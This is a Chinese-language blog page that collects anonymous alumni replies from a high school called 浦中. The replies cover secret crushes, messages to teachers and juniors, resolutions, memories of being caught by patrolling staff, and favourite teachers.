title="#有关浦中的小秘密"></a>#有关浦中的小秘密</h2><p>Re:其实我不喜欢他了</p><p>Re：其实从前的我并不喜欢百里，只不过和你一起打游戏不知道聊什么好，选百里你会很开心地和我抢，倒也觉得有趣，就这样笨拙地让你误会了。已经忘记大概是什么时候（依稀记得那会儿，王者已经出了百里的特工魅影，我俩都买了）有一次和你百里1v1，我已经杀了你很多次，但有一个走位躲掉你的狙，是因为我偷偷瞥了你一眼。后来那把你杀我的第一个人头，有弹不瞬，不开大不开闪，不过是因为瞥你的那一眼，你蹙眉的模样着实比平常丑罢</p><p>Re：其实他真的一点也不好</p><p>Re:可惜我还忘不了她</p><p>Re:喜欢优秀的人是一件美好的事，永远迎头而上</p><p>Re:高二教室门口花圃还埋着条🐟</p><p>Re:焯哈哈哈哈哈哈哈哈哈哈西米和黑糖珍珠</p><p>Re:陈小艳上课给我剥的橘子超甜！被投喂的感觉嘎嘎幸福！</p><p>Re：我喜欢过黄科森，我配不上他</p><p>Re：黑糖珍珠死于自己作死跳出鱼缸</p><p>Re:西米我忘了咋没了的</p><p>Re(咸鱼):我爱王国权</p><p>Re 同上</p><p>Re(小桃呀)：其实我敲爱我的好朋友的！！！！（张秋菊，黄芷钰，覃冰，覃雪，米芝蓉，刘薇，韦森，宁珍，蔡美玲，韦森……还有好多好多）</p><p>Re（人在武汉刚看了一场雪）:想吃九班的薯片了，茶后会。</p><p>Re：龙世钦好喜欢</p><p>Re:我上厕所没冲过水，都是舍友上完帮我冲，节约用水，哈哈哈哈哈哈哈哈哈哈哈，我最牛逼！</p><p>Re：希望我们友谊天长地久！！toL…</p><p>Re:关于每次早上去小黑吃粉然后吃完再进去买点东西，白嫖粉钱的那档事</p><p>Re：高中三年，最舍不得的班级是班主任是小妃，语文老师是厌厌，英语老师莉莉，物理老师美女敏，化学老师昌姐，生物老师琳夏……泪目了，好怀念那年</p><p>Re：我真的忘不掉她</p><p>Re:我也忘不了她 </p><p>Re:我喜欢过你 但不懂你怎么想的 好模糊 若即若离 忽远忽近</p><p>Re:楼上，趁她还单身去追回来😄</p><p>Re:我还是没有达到自己的目标，我还没有成为那个想成为的人，我还没有大胆主动一次要过他的联系方式，所以我现在和他一点交集也没有了</p><p>Re：高中太拼了，没有好好停下来去好好体会身边的一切。</p><p>Re：大学违背了自己高三的理想</p><p>Re：喜欢上了他。</p><p>Re（波吉）:考完试才知道自己喜欢上了一个人</p><p>Re：对啊</p><p>Re:后来我把手机音量调的再大，歌也没有学校的音响放的好听</p><p>Re:某某是个大笨蛋憨憨，太直男了憨憨。虽然你是个笨蛋，还是忍不住想要是我再温柔点就好了，我再聪明点，就不会为难遗憾</p><p>Re：喜欢她很久，做出一定的努力，虽然最后是没有成功，我对自己有了不小认知，愿你我未来更好。</p><p>Re:其实我真的很珍惜每一个在我身边的朋友 我没有想让你们离开 我只是在逃避这份自己处理不了的感情 假装“我不在乎”你</p><p>Re（冬日可爱）:你不知道我曾经很喜欢一个男孩子，从初一到高四，复读一年是想努力追上你的步伐，我真的很争气来了你的学校，开玩笑似的叫你学长，发现一年真的变化好大，你已经有了你喜欢的人，祝你们幸福啊。就让这份单箭头的暗恋到此为止吧，我要去追求我自己想要的（快滚去复习!）。</p><p>Re：其实我知道但还是忍不住心动 直到被泼了冷水 可是再回忆也还是很触动，虽然早已经不喜欢了 不是当初那种感觉</p><p>Re（半仙）：某个16班花圃下埋着一枚游戏币∵</p><p>Re：遗憾没能和他一起上大学，遗憾没有如他所愿，遗憾只是过客</p><p>Re:可能就算他看到这段文字，也不会相信我曾经喜欢了他四年。曾经的我自卑到逼着自己努力才稍微感觉自己能配得上他。现在的我过的很好，自信且强大。谢谢他的存在，是我青春里的一束绚烂烟花，照亮过我的黑夜。还有，希望我们的未来一切顺遂。</p><p>Re：文印室的窗外有很多毽子哈哈哈哈</p><p>Re: 我喜欢过你……</p><p>Re：我也不知道喜欢是什么感觉，但是好像真的心动过。</p><p>Re：浦中爱我，我爱浦中。</p><p>Re:好多，不能说</p><p>Re:嘴里说着不喜欢她了，但心心念念的不就是她吗？</p><p>Re:2021年我不要再喜欢他了</p><p>Re:高中的唯一一次心动在高二，记忆犹新。操场上的匆匆一瞥，到后面的在同一个班，我以为是缘分，原来只是巧合。</p><p>Re:高三（10）的挖蛆人必须有姓名，到底是谁在花圃地下埋鸡蛋，那些虫子我再也忘不掉了</p><p>Re:表白我自己</p><p>Re:愿我们在彼此看不到的山顶熠熠生辉。</p><p>Re（小桃呀）：表白高三宁俊茜！！！祝愿他今年考出理想成绩，考去理想大学！！！还有，祝他天天开心！！！</p><p>Re:喜欢他快六年了吧？从初二开始一直到现在，没有勇气去表明自己的心意，如今我们也没有了联系，就好像不曾认识一样，他的消息也是从他人口中了解到一些，现在的我也分不清对他是喜欢，还是一种习惯。就是希望他在重庆一切都好吧！</p><p>Re:其实我在你看不到的地方偷看了你无数次</p><p>Re:啊，是青春伤痛文学。</p><p>Re：王国旗王国旗王国旗我们一定要四年四年再四年我们要一辈子</p><p>Re:其实没有遇到很喜欢的人，只是心里比较孤单，喜欢把对方当成精神寄托。</p><p>Re：我喜欢他，但是我在等自己变优秀，下次再见面，我不会冷冰冰，也不会说反话</p><p>Re:某年某月某日你会发现原来你喜欢的人早就有了女朋友，上了大学之后，你会发现好像你也不会时刻想起他，见到他女朋友的照片也不会有太多的所谓。</p><p>Re:楼上对啊对啊，为啥咧？是没真正喜欢过吗？传说中的吊桥效应？但是对于好朋友又不想让他有女朋友呜呜呜为啥会这样</p><p>Re：to楼上，也许喜欢过，只是漫长的暗恋被时间冲淡了，大学里有很多人，他也不再是你生活的中心。也许，是得不到回应的暗恋，是时候放下了。也许，是喜欢，但喜欢不是爱，单方面的暗恋是没有办法持续很多很多年的。</p><p>Re：to楼上，就其实接触也不大多，是不是自己以为的喜欢一种错觉咧🤔🤔🤔</p><p>Re:可能你对他只是好感吧，好感不是喜欢😂😂😂</p><p>Re:表白LCY，勇敢又努力！可可爱爱！</p><p>Re:遗憾在于害怕，害怕的东西多了，时间，经济，距离，人物，心，灵魂，就这样吧，也挺好。</p><hr><h2 id="你有什么特别想对高中老师说"><a href="#你有什么特别想对高中老师说" class="headerlink" title="#你有什么特别想对高中老师说"></a>#你有什么特别想对高中老师说</h2><p>Re：感觉大浦中的老师都很辛苦，尤其是高三的，但是敬业这个词却在他们身上发挥的淋漓尽致，四年下来遇到那么多位老师是我的荣幸，非常非常喜欢他们，希望老师们身体健康，万事如意，桃李满天下！</p><p>Re(波吉)：lily我一定会带长沙的特产回去给你的</p><hr><h2 id="再有一次，还有多少人愿易重来浦中三年"><a href="#再有一次，还有多少人愿易重来浦中三年" class="headerlink" title="#再有一次，还有多少人愿易重来浦中三年"></a>#再有一次，还有多少人愿易重来浦中三年</h2><p>Re：青春真的很想重来</p><p>Re:很苦很累，但都是充满美好回忆，这就是青春该有的样子，但我们要一直往前走</p><p>Re：不来了，咱们永远要向前走，往前看</p><p>Re：那就一直往前走吧</p><p>Re：现在身边这群脑瘫翻，️让我很难不想</p><p>Re: 不来了叭，美好的永远是回忆</p><p>Re:再来一次，或许还是同样的结局，但或许也会有更好的过程，当然结局也可能更好。</p><p>Re：不了吧，可能我太孤独了，不想重新体验那种感觉 但是也交到了几个很好很好的朋友，也不是很难过了。</p><p>Re:不会吧不会吧，不会有人没有偷偷拿过充电宝到空教室充电吧</p><p>Re:还是想回到抬头就能看到她的那个教室    </p><p>Re：青春不回头，我不愿意，但我会铭记这段记忆</p><p>Re:如果可以，我真想重来。高考失利真是我最意难平的事。</p><p>Re:别了吧，高中那三年也挺累的，现在过的也整挺好，就不重来浦中三年了</p><p>Re:回忆只能是回忆，不能强求，也不想重来。</p><p>Re（波吉）:踏路而行，自有前程</p><p>Re还想再被苏总抓到抽烟！！“动作快点”笑颠我哈哈哈哈哈哈🤪</p><p>Re:往前走，莫回头，人皆前行，各有前程。</p><p>Re:向前走吧。</p><p>Re:不回来了 留下的和再来三年的终究是一样的 开心往前叭哇呀呀呀</p><p>Re:想回去，完成那些遗憾的事</p><p>Re: 相信自己，未来可期 </p><p>Re:如果再来一次，我愿意再次回到那个温暖的大家。这一次我一定不辜负自己的青春，拼搏高考，给自己的高中生话画上一个圆满的句号。</p><p>Re：如果还要经历一次高考的话那还是算了🙏</p><p>Re：不愿意重来，高中三年是最痛苦的。</p><p>Re:愿意，那样热烈的青春如果她们还在我身边，我就什么都不怕</p><p>Re：最美好的是回忆            </p><p>Re: 就算重来也不是当初了</p><p>Re：别回头。</p><p>Re:希望和他真的有下一个，再下一个四年吧</p><p>Re:就让它永远地留在心里吧，成为最美好的回忆</p><p>Re:我们都应该向前走</p><p>Re:这是我青春里最美好的一段回忆</p><p>Re:如果这个学校没有她，我还想留在浦中</p><p>Re:不一定想重来，只是因为这是我人生中非常美好的三年。</p><p>Re：向前走，永不回头</p><p>Re:不问来时路，不等过去人，洋洋洒洒看今朝</p><p>Re（窦房结）：不必了吧，再来一年我都没能下定决心回去， 以后有机会回去看看就行。高中三年终究没能让自己成为想成为的人，也感觉失去了很多。</p><p>Re:真的该好好学习，千万别来柳铁了。</p><p>Re：记忆虽美好，重来算了吧。 </p><p>Re:那是我最快乐的时光啊！</p><p>Re:很想重来啊，想再拼一把，想重新成就自己，想那一群同学。但，那段时光永远也回不去了，成为了我们最美好的时光。</p><p>Re:我一定好好努力，好好珍惜身边的朋友，考自己理想的大学！去想去的重庆！一定不会再自卑，也不会傻傻地等一个人！</p><hr><h2 id="再有一次，你会向谁表白"><a href="#再有一次，你会向谁表白" class="headerlink" title="#再有一次，你会向谁表白"></a><strong>#再有一次，你会向谁表白</strong></h2><p>Re:如果再来一次啊，我希望我们从未认识。                                                                                           Re:我还真挺没用的，匿名到这种程度都不敢表白。</p><p>Re:我喜欢黄乃煊三年了，从高中的第一次相遇到高考结束我都没敢开口，如果能从来我一定把那四个字说出来</p><p>Re:我喜欢容宇！虽然他已经有女朋友了，但也没关系</p><p>Re:容XN</p><p>Re:我喜欢喊LJPZ</p><p>Re:我喜欢lwj</p><p>Re:有个姓罗名显金的，注定是我得不到的人</p><p>Re:龙yg，我滴超人（龙1神！yyds）</p><p>Re:我喜欢wls1000年了，如果再给我一个机会，我一定会跟他表白</p><p>Re（远野）:我喜欢李田所三年了，一直都没来得及表白，我希望能和你一起躺在午后阳光下，并且喝一杯热热的红茶</p><p>Re:我感觉我以前有点欣赏你sqg</p><p>Re:表白郭诚丽，小短腿美女嘿嘿(º﹃º )，不知道那个谁是不是她男朋友</p><p>Re:我喜欢hqm</p><p>Re: 不是喜欢他，是难得遇见的好人。负责有担当。祝福找到他爱的女孩子。</p><p>Re：就算是双向奔赴也不会选择表白，因为喜欢的人实在太优秀了，而且读了大学以后才知道我们也不可能再是双向奔赴了</p><p>Re:可是，没有。</p><p>Re:我以为他知道 ，他不知道事实上他也知道只是他不做回应 我也不再愿意说出 还是勇气不够叭 现在看来 喜欢你真的是一件让我有盼头的事情 你一定一定要获得幸福！</p><p>Re：很庆幸去到了东滨路249号上学，在那里认识好多好多的朋友，无论是做什么，都会有回应的朋友，大家一起度过很多的美好时光，一起在课堂上笑过，一起在课后打闹过，一起在深夜学习过，一起在走廊追逐过，一起在宿舍开心过，也一起在高考的战场上拼搏过。尽管我回去复读了一年，但是我们的感情依然没有变淡，反而更加深厚牢固了。我也依然是那个最受她们宠爱的小宝贝，嘻嘻嘻嘻。</p><p>Re:加油！我在大学等你们！</p><p>Re：再有一次，我想，会和他一起加油，一起冲刺高考，然后去有他的大学，而不是他送我冲刺。</p><p>Re:想看雪。。</p><p>Re：HYC，其实每一次相遇，都是我精心的安排。</p><p>Re（优）：秀啊，好遗憾啊是吧，我们</p><p>Re：迈向光明之路，注定荆棘丛生</p><p>Re:很可惜，很多人说我很高冷，其实我很沙雕，居然没有谈恋爱，好扎心</p><p>Re:还是没放下，还是喜欢你，会不会那时候再勇敢一点，结局都不一样</p><p>Re：（中南仙贝）我的原野在哪里，我要雷普陈嘟嘟</p><p>Re：我毕业了，他来了浦中复读</p><p>Re:再等一年吧，再等我忘了他，我就放下了。</p><p>Re:说不出口，没有把握，没有想法。这个年纪的喜欢好像和恋爱很不一样，不求结果，却很难忘。真说起来，什么是喜欢也不明白，没有承诺，没有要求，只有心动。在后来的日子，答案又变得不再重要了。我不知道你是不是喜欢过我，我是不是喜欢过你，但没关系，我看见过你，你的眼睛。那是一双纯洁可爱的眼睛，你是一个纯洁可爱的人，我会想起这些，在我想起其他美好的事物的时候</p><p>LZ给爷永远幸福快乐</p><p>Re：xx_zhenghai哈哈哈哈哈哈哈</p><p>ReLIJIE(做化学实验的美女)：每天都很忙是真的，但真的很充实 这种感觉真的很好。学弟学妹们要加油哇～</p><p>Re：上海底层人民想起曾经给门口保安取过“鲁迅 李大钊”等等外号（对不起）因为他老是很凶并且拦过我带最爱的校门口三轮车买的加了热狗和火腿肠的豪华版炒粉。下次带上海媳妇回去一定要给她吃一次小江的冻粉</p><p>Re：人在西安正在努力抗击疫情，兄弟们都要加油，不能丢了我们大浦中的精神。在等雪花  新年烟火 和更好的我们。</p><p>Re：愿能以更好的姿态另她欢喜。</p><p>Re:  人在天津上学，已放假。现在人在高铁上，回家。和他相恋三年，每一次见面都是不舍，还是怀念在高中的日子的，一起从相识相知到相恋。有美好回忆，也有闹别扭。希望他能开心，希望幸运之神一直眷顾他。希望他能一直一直..</p><p>Re：scp我们爱你🥱</p><p>Re：熬不下去了，没钱没有资本 想回高三休息一下                         3</p><p>Re(懒鬼):咱就是说，期末复习不想复习，我想回家啊，想念浦中的晚霞了，还有我们的老师们</p><p>Re:再来一次，或许依旧不会告诉他，我好像喜欢过他，从始至终都是我在作多情吧，毕业了，你马上去牵了别人的手，我们也成了熟悉的陌生人。</p><p>Re:我高中没有特别的回忆，只有她留在我记忆的最深处，我试着去靠近，却从没有靠近，我知道我有着执念是我当初放不下，是我的唐突让她感到不适，她又几曾何时知道，上课睡觉不经意的抬头是我高中三年见过最美的风景啊。</p><p>Re:如果还有机会，我还想再来浦中一次!!!</p><p>Re:不想回了，浦中给我的回忆太多的痛苦，我喜欢现在的大学生活，沙雕的舍友，细节的男朋友，友爱的班级，温馨的部门。</p><p>Re:怀念了我的高中，还记得刚刚进浦中，军训，一边跑操一边喊浦中校训，记忆深刻，浦中我们再见</p><p>Re:想浦中小黑</p><p>Re:喜欢的太多，现在已经不喜欢</p><p>Re:初三初见，高一苦恋，高二翻脸，高三如愿。不知道能走多远，希望能有个不算太差的结局</p><p>Re：（晚安）</p><p>Re:再来一次我可能不会答应他的告白，异地太苦太难熬了，你也不想再坚持了。</p><p>Re：彭森  劳思婷  陈镜妃叶子张丽莎  他们好好玩哦！</p><p>Re:这辈子只喜欢一个人，如流星划过我似水的高中时光，即使回头望青葱，回忆仍如清露挂满了我尚未成熟的心帘，大学缤纷，却拨弄不开，我的苏朝平</p><p>Re:想吐槽cwq，最讨厌这个人了，总是多管我的闲事，人也笨，麻烦，讨厌，烂好人，容易被骗，讨厌，总是操心个不停，像个老妈妈一样，麻烦死了，讨厌，冲他发火也不会生气，自作多情，最讨厌了，讨厌讨厌讨厌，最讨厌了，但在我哭的时候又会温柔的安慰我,在我遇到困难的时候总是来帮我，有一点点喜欢呢，保护我的时候却，那么帅气，关心我，的时候又那么温柔,无理取闹也不会生气，喜欢你啊!八嘎!为什么察觉不到啊，八嘎八嘎八嘎，最讨人厌啦。但又是那么喜欢你，suki, suki,daisuki，笨蛋，再多看看我啊!毕竟人家，最喜欢你了啊。</p><p>Re:很想念每天跑去</p><p>高中老师说上大学就轻松了。</p><p>骗人的，我现在跟高中一样，还有早晚自习!</p><p>离谱</p><p>Re：不要相信到了大学就轻松了，人在桂林，星期六专业课满课，还经历过大学老师抢课补课，就离谱。最后很想念浦中的晚霞！！</p><p>Re:总要回一趟浦中吧，因为这里有留恋不舍的风景，和不舍的人。想念浦中的一切了，人在远方，总是还会怀念家的地方</p><p>Re:陈桦我等你来当我的学妹！！！</p><p>Re:王嘉然🤤！！</p><p>嘉然小姐，🥰我真的好喜欢你啊！😡为了你，我要咬打火机☠️！！</p><p>Re:是她吧，廷</p><p>Re:周末秃头计划！ </p><p>Re(桂林)原来真的可以有这么一个人，可以喜欢这么久，就算不联系，还是喜欢。我的高中真的很幸运，遇到一个这么优秀的人。有些人离开了就永远离开了，我努力了，尽力了，不知道什么时候才能放下，但是回想起来，还是美好的。还有好多想对你说的话，就静静的躺在日记本里吧。希望你永远都是最闪耀的那颗星星。</p><p><img src="http://cdn.lmark.cc/img/ULP3WZA14fSRajY.jpg"></p><p>Re在这座小县城的中学，也曾有过两个男生的故事</p><p>Re:那就再勇敢一次吧:</p><p>Re(一个一个学生):唉，都是旧事啊……但现在也一直喜欢黄科森。</p><p>Re:阮某！我还是想说你是我见过最帅的boy!</p><p>Re:我永远爱我的室友们！尽管我们已各奔东西，但我真诚希望你们幸福。</p><p>Re:反正没人知道我是谁，喜欢过20届毕业生三班 的zy，据说毕业那天有女朋友 了，就此别过。 </p><p>Re:喜欢WYL，可是现在再给我一次机会，我不会再表白了。         </p><p>Re：喜欢五年的女孩不在浦中，我一直以为她会在的 ，到现在已经杳无音讯了，宁愿错过也不主动是吗，dql</p><p>Re: 感谢L，陪了我六年，</p><p>Re（晓生）：喜欢十二班一个姓赵的姑娘，夏日一白裙袭目，久久难忘 藏着心里，希望她永远不会知道。赵客缦胡缨，吴钩霜雪明。谈不上是喜欢，只是一时的心动罢了，她有活出公主的能力，我亦有把她写进故事的毅力。为此赋予她一个小说名（赵婧凝）暗暗写进故事里，写给往事人烟去。</p><hr><h2 id="立个flag吧"><a href="#立个flag吧" class="headerlink" title="#立个flag吧"></a>#立个flag吧</h2><p>Re:我敢说这里出现最多的就是晚霞和苏朝平了（狗头保命）</p><p>Re:在浦中拼搏了三年，我绝不对会让自己活成那年我最看不起的样子，也不会再错过你了。</p><p>Re:我今天就是饿死，死外边，从这里跳下去，也绝不会吃你一口饭。诶真香诶～      </p><p>Re:期末我一定不挂科！</p><p>Re:打游戏一定要沙暴韦老师！</p><p>毕业了，实习没找到，论文没写完，前途好迷茫</p><p>大家都不用学习的吗？</p><p>Re(物联网）:今天(12,25)我将创造一个奇迹，一天不干饭</p><p>Re：我会更好！我会前途无量！</p><p>Re：剩下两年好好努力，在二十岁成为自己想要成为的人吧</p><p>Re:十八岁我就要忘记他！年年期末不挂科！</p><p>Re:十八岁我也要忘记他啦！就当是放过自己放过他了</p><p>Re:快要高考了，你们要好好加油啊，这些鼓励可能会过于苍白，但是希望所有好好运都留给你们，加油29班的朋友们，我心心念念的你们。祝大家万事胜意。</p><p>Re:成为想成为的人！不再平凡！闪闪发光！和他一样！</p><p>Re:陪学委去江苏看麋鹿，去看大雪纷飞，去感受-8的海拔地形，去领略那边的风土人情，我要和他走到最后！</p><p>Re.：加油三20（2018届小华姐）的宝子们！！！！一定要对得起自己的努力啊！！！！</p><p>Re:我会拿到蓝桥杯省赛的！加油！国二奖，冲定了！</p><p>Re:期末不挂科！今年湖南下雪！    </p><p>Re:明年一定要拿到robotmaster的前四强！还有国奖，还有奖学金啊！</p><p>Re:考研上岸，希望自己以后是个富婆！愿我所愿，都能如愿！</p><p>Re(波吉):一点点的不耐烦我就走吧，然后祝我有钱。我就是这么俗不可耐</p><hr><h2 id="被巡堂的总裁们抓包实录"><a href="#被巡堂的总裁们抓包实录" class="headerlink" title="#被巡堂的总裁们抓包实录"></a>#被巡堂的总裁们抓包实录</h2><p>Re:我想了想居然没有，嘿嘿嘿~~</p><p>Re:彩虹哥发现我在偷偷看《半生缘》，我抬起眼睛看他一眼，赶紧收起来，他的小眼睛里有一个教室那么大的笑意，最终什么也没说，转身走去。</p><p>Re:上语文课折星星，被石主任在窗外盯了好久，都没反应过来啊啊啊！！！关键是我还没学会，我连一个都没折好……</p><p>Re：自习课趴在桌睡觉，钟钦过来揉了揉我的头发，温柔的微笑着说“困了叭？”，妈呀她太温柔了。还有一次也是睡觉，苏朝平在窗边推了推我的手，就走了，他也好温柔呜呜呜。</p><p>Re：因为书堆得太高大半个班都被苏总记了哈哈哈哈哈哈哈哈哈哈哈哈蚌埠住了</p><p>Re:狼狈到被请家长（不愿透</p><p>Re:转头遇见苏总系列:第一次刚眯眼睛三秒钟，转个头就看到了苏总，然后被记了，后来啊，我上课偷偷剪个指甲，弄点小东西，一转头又看到苏总啦，但是他后来都没记过我名字，只是说了几句就走了，呜呜，莫名觉得他有点温柔可爱</p><p>Re：坐窗边时睡着了经常睁开眼就看到巡堂领导，死亡对视啊。</p><p>Re:新买的魔方在距离下课还有十分钟被小石哥哥缴了😭😭</p><p>Re:拉起衣服看胸肌都能被记，笑死我了!      </p><p>Re:好几次在考试时，和上课时画瑟图，然后苏总从后面走过来，看了一眼马上走了。    </p><p>Re:被教室嗦粉帮苏总抓包 </p><p>Re:嗦粉被苏总拍照🌚还有转笔被抓🌚睡觉被抓🌚不过有一次自习课打瞌睡苏总拍了拍我就走了😬😬😬真的好怀念高中啊            </p><p>Re：在窗边看小说被庞总抓住，鬼使神差不承认，拉扯了几个来回后面怂了。还有英语课睡觉被石主任记名，然后被小妃请进休息室</p><p>Re:上课把手搭在同学的肩膀上居然被石总督记名字（我啥也没干啊）了🙃🙃🙃🙃🙃</p><p>Re：虽然不是我被抓包，但是还是很想笑，因为是小姐妹zijun姐姐被苏某平抓到看小说了，那时候，一下课我和她去办公室找他说这是我的生日礼物，让他还给我（其实是她的，哈哈哈哈），不太会撒谎，然后苏某平直接说我高考之后还你，一定好好保管，我尴尬的笑了，他又说，我已经看见你在看小说了，看了你两次都在看小说，没有上去抓你（当时是晚自习），特地等到第二天早上看你有没有看（她被抓前还跟我说，苏某平怎么可能六点四十上来抓我，我就看一会儿），后面被抓了，我笑到肚子疼了，哈哈哈哈哈哈哈哈哈哈（我不想笑，除非真的忍不住，哈哈哈哈哈哈哈），书还没有要回来~</p><p>Re:csb和gzc的鸡蛋🙂被窗边的scp指指点点被讲台上的whq 暗中批评</p><p>Re:苏总缴了我的计算机呜呜呜呜呜呜呜……</p><p>Re：苏总缴了我的书，本来想毕业要回来的，他跟我说被丢了呜呜呜呜一整个难过</p><hr><h2 id="我想和某人说"><a href="#我想和某人说" class="headerlink" title="#我想和某人说"></a>#我想和某人说</h2><p>Re:曾看到一句话，想起这辈子懊悔的事，后山的梅花便都落下了。我说不清对你是一种什么样的感情和情绪，那么多年都过来了，活在臆想中，活在梦里，我以为我们是同类，我以为我足够了解你，结果不是。但怎么样都好，起码你也曾是我生命中的光和热。只是从物理上看，生命是一个热寂的过程，宇宙终极命运的一大假说也是热寂。正如我对你的感情，也是如此的吧，我这样想着，可回忆有时就是那么调皮，在你生活已经快要淡忘掉那个存在的时候，它会突然跑出来，微微的刺你一下，不会很难过，但绝对不好受。 life always fulls of suffering ，所以往前看，别回头，一切都好，这段九年的暗恋，多年的念念不忘，该有个句号了。</p><p>Re:我想和第一次走进浦中的我自己说，你不是兔子，但你输不起</p><p>Re：试试考研吧，考上了再说读不读的问题</p><p>Re：认真学习，不要辜负你的梦想，结果怎样，全力以赴才知道不是吗？现在放弃不是一件好</p><p>Re:下次见面该叫我学姐了！嘎嘎快乐！</p><p>Re:（浅夏）在懵懂的青春里，很开心你能够出现在我的生命里，然而又很可惜，你只是我生命里的过客，你并没有坚定的选择过我……也许上天只是安排让我们相遇，剩下靠我们自己掌握，不过真的很感激你曾经对我的好，我们只是有缘而无份，那些美好就当作是我的青春印记吧，愿你一切安好～（深秋晚露）</p><p>Re: 米淑叔高考要加油哇！！你一定能考上你理想的大学的XD，</p><p>Re（人在福州）：以前总是嫌浦中烦得很，现在却真的很想很想东滨路249号😭，好怀念浦中的人和事，连傍晚的美丽晚霞也念得不得了，可是我们真的都回不去了，也回不到过去了，希望陈怡霞，卢健，吴俊竺，黎鼎聪能好好坚持住，天天开心，不断进步，我在福建等你们的好消息，一定是好消息！还有梁伊静，余秋蓉，陆家俊期末考试顺利，取得好成绩！天天笑嘿嘿的开心！</p><p>Re（人在福州）：还有啊，梁婷婷你给老子在家老实坚持住，规划好自己的时间，不管怎么样相信你能行，潜能无限量！</p><p>Re 别来黑龙江读书，别来东北，哈哈哈哈，你不一定适应这边的伙食，挺想念浦中的</p><p>Re：还记得我吗 我一直都没忘甚至经常想起 你估计早抛在脑后了吧</p><p>Re：可以和你认识吗</p><p>Re:米少、冯然、赵赵、金如以及所有还在复读的可怜的娃们，加油💪！冲冲冲！</p><p>Re:想念一位姓宁和姓陈的人，希望你们都好好的</p><p>Re：一直很想对张菲菲说，感谢和你相遇，我还清晰记得你与我第一次说话的时候。和你相处感觉很有趣，我们的想法观念能达到一致，一起行事，你也会支持我。你的开朗、可爱、大胆真的能影响我，改变我，也让我更勇敢开朗了，非常感谢。刚开始我们很好，时间流逝待久了感觉确有了点什么，也许是厌倦，看惯了😶😶。时间确实是能考验人的，考验人与人之间的关系，经过了可能会变牢固。而我现在也非常怀念与你一起，说说笑笑，站在走廊看风景，去休息室找老师聊天。非常感谢如此的你带动了这样的我。</p><p>Re:   SQ很抱歉对你做的错事，至今我也无法原谅自己 哎。</p><p>Re:想和宁某说，我觉得我们还是太幼稚了 也许是性格不和 但是我们快乐的时光难道不比吵架的时间多吗 难道不是发自内心的开心吗？彼此都太要强了 只希望后来的我们能把恩怨一笔勾销 各自安好。</p><p>Re:想对z说 彼此放过 不要留念想了</p><p>Re：如果时间能倒流，我会选择远离你，不想伤你的心，道歉的话到毕业也没能说出口。</p><p>Re:有时，我总会幼稚的后悔:如果当时控制好自己的情绪，不那么放肆，好好的做事情，好好的学习，对你也不会动心，那么现在一切会不会不一样，说实话，你是真的渣。到最后，不后悔了，毕竟你让我看到了我身上的缺点，我在试图变得更好</p><p>Re:做一个自信的女孩，你其实一直都很棒！</p><p>Re：高三26班的某个人，我在桂林等你来，别忘了你是要考桂林医学院的人，别掉链子啊</p><p>Re:想对他说，我们下辈子还是不要认识比较好</p><p>Re：我知道她不会跟我道歉但我一直在等，希望我们从来没有认识过最好了L，也不会有这么多事让我耿耿于怀了。</p><p>Re（晓生）：喜欢十二班一个姓赵的姑娘，夏日一白裙袭目，久久难忘 藏着心里，希望她永远不会知道。赵客缦胡缨，吴钩霜雪明。谈不上是喜欢，只是一时的心动罢了，她有活出公主的能力，我亦有把她写进故事的毅力。为此赋予她一个小说名（赵婧凝）暗暗写进故事里，写给往事人烟去。</p><hr><h2 id="你有什么话想对学弟学妹说"><a href="#你有什么话想对学弟学妹说" class="headerlink" title="#你有什么话想对学弟学妹说"></a>#你有什么话想对学弟学妹说</h2><p>Re（头秃当中）：好好学习ｸﾞｯ!(๑•̀ㅂ•́)و✧，努力学数学，要不然就像我一样，每天被高数折磨        </p><p>Re   (人在疯狂中):好好学习的过程多参加活动，尝试去做不一样的事，留下美好回忆，不让自己有遗憾</p><p>Re:我终于懂为什么有些人会怀念那一段高压之下的生活。因为目标明确，信念坚定。一定要想清楚自己到底想要什么啊。加油↖(^ω^)↗，卷si他们！</p><p>Re:</p><p>你在浦中有什么回忆？ 旧事啊</p><p>浦中的饭菜怎么样？ 酒食啊</p><p>浦中大概有多少个班？ 九十啊</p><p>浦中一个班有多少个老师上课？ 九师啊</p><p>你来浦中读书是为了什么？ 救世啊</p><p>在浦中最喜欢喝什么饮料？ 苏打哟</p><p>浦中食堂的炸鱼怎么样？酥的哟</p><p>每天早上上课要迟到了怎么办？ 速达哟</p><p>浦中领导里面谁给你印象最深？ 苏大哟</p><p>老师上课提问到你怎么办？ 肃答呦</p><p>好!</p><p>考试都给我冲冲冲</p><p><img src="http://cdn.lmark.cc/img/5WNHPCTzMQ7aOih.png"></p><p>Re:感情重要还是前途重要?对我（一般人）来说，十八岁前，前途重要，十八岁后，感情重要。十八岁前，懵懂无知，感情大多数不了了之，但不可否认，是真的很美好，所以前途重要。十八岁后，慢慢步入社会，开始体会到人心的冷漠，人情冷暖，那时，如果身边有一个她，有精神支柱，会好很多。真的，会好很多。可惜我都没有做好。 当然，如果你找到了你的Soulmate，那就不要理会别人的看法（这无关性别，你要记住在没打扰到别人生活的前提下，生活是你们自己的，好好生活，比什么都好），好好努力，不要被生活的柴米油盐，一地鸡毛打败。未来未来，命运仍可期变。</p><p>高中之后，你会发现你整个人是被推着走的，人生历程好像被按下快进，忙着高考，忙着大学复习考试，忙着考研，忙着找工作，家里催婚。anyway 只有努力才能过上你想要的生活</p><p>Re：好好努力吧！虽然浦中的生活真的过久了让人觉得很枯燥、很压抑，我永远都忘不了那天中午起床，听着广播放的《燕归巢》，当时是哭着上教室的，没有人知道，没有人看见，最后又自己擦干眼泪，继续听着英语听力…..还好我坚持下来了，考了一所自认为还蛮不错的学校，虽然不是心仪的重庆。好好努力一定没有错，那些没有盼头的感情，选择放下吧，但是谁的青春又没有一个那个他&#x2F;她呢？其实很难做到放下，但是如果再给我一次机会，我可能会选择梦想多一些。所以，还是好好努力吧~希望LZT弟弟要好好加油呀！</p><hr><h2 id="在浦中最喜欢的老师？为什么？"><a href="#在浦中最喜欢的老师？为什么？" class="headerlink" title="#在浦中最喜欢的老师？为什么？"></a><strong>#在浦中最喜欢的老师？为什么？</strong></h2><p>Re:庞万秀老师 好帅啊 他骑摩托的亚子 是挥之不去的回忆。</p><p>Re:韦老师</p><p>Re:赖小强</p><p>Re：李灿兰老师</p><p>Re：包运    人美心善啥都会，女强人！！</p><p>Re:小玲老师，温柔体贴，人美心善❤️</p><p>Re:杨老师说过，开心平安最重要！</p><p>Re:易大师！</p><p>Re：喜欢罗！昭炬！胡丽英！小妃</p><p>Re：可爱的赵仕媛老师</p><p>Re：肯定是老高了！！（高兴利）</p>]]></content>
      
      
      
